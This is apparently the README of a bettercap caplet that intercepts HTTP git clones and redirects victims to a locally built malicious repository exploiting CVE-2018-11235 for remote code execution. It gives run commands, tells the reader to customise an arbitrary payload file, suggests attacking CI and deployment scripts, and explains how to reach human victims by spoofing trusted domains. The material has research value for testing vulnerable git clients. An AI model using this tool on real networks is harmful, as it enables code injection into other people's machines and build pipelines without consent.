# Caplet for exploiting CVE-2018-11235

This caplet is intercepting http/https git clone attempts and
redirecting them to local http server that serves a malicous
repository leading to exploitation of CVE-2018-11235 on vulnerable
client.

## How to use

1. Create a malicious repository with `build_repo.sh` script. The
   script will take the contents of `payload.txt` as payload -
   customize the payload file to your needs.
2. Run the caplet with:

```
bettercap -caplet caplets/gitspoof/gitspoof.cap
```

## Alternative use cases

You can control to which repository redirect the victim, by changing
`gitspoof.repo` variable to an IP or domain (do not prefix with
http(s)). This way if the victim is not susceptible to CVE-2018-11235
you can still try to inject arbitrary code into the repo - this might
come in handy when trying to exploit some bad CI/deployment scripts.

## Limitations

Obviously the script won't be able to intercept https git clones
unless you can obtain a valid SSL cert or the victim used `-c
http.sslVerify=false` configuration option.

The script was aimed at attacking automated systems not people
therefore the repo layout doesn't try hard to look inconspicuous ;)

Attacking human with this caplet would require to also spoof some 
trusted domain and point it at bettercap server since Git will always
notify the user about http redirect.

Finally - all the CVE-2018-11235 limitations apply - to get RCE the
victim needs to have vulnerable git client **and** do a recursive
git clone (or initialize the submodules afterwards).

## POC testing 

You can test the script yourself without arp poison:

1. Setup vulnerable git on your system
2. Fire the caplet (remember to run `./build_repo.sh` first!)
3. On vulnerable system run: 

```
http_proxy=<ip address of bettercap machine><bettercap_http_port> git clone --recursive http://github.com/bettercap/bettercap /tmp/exploit
```

(**NOTE**: we are intentionally trying to clone via http on github)

The clone should trigger the default payload.
